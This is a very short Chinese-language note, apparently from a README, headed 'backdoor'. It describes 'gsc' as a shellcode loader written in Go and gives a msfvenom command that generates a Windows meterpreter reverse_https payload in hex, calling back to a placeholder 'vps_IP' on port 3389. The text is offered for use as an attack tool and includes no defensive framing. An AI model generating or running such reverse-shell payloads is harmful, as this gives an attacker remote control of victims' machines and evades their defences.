后门

gsc 是使用golang编写的 shellcode loader

生成shellcode的方式 
msfvenom -p windows/meterpreter/reverse_https -f hex -o rev.hex LHOST=vps_IP LPORT=3389
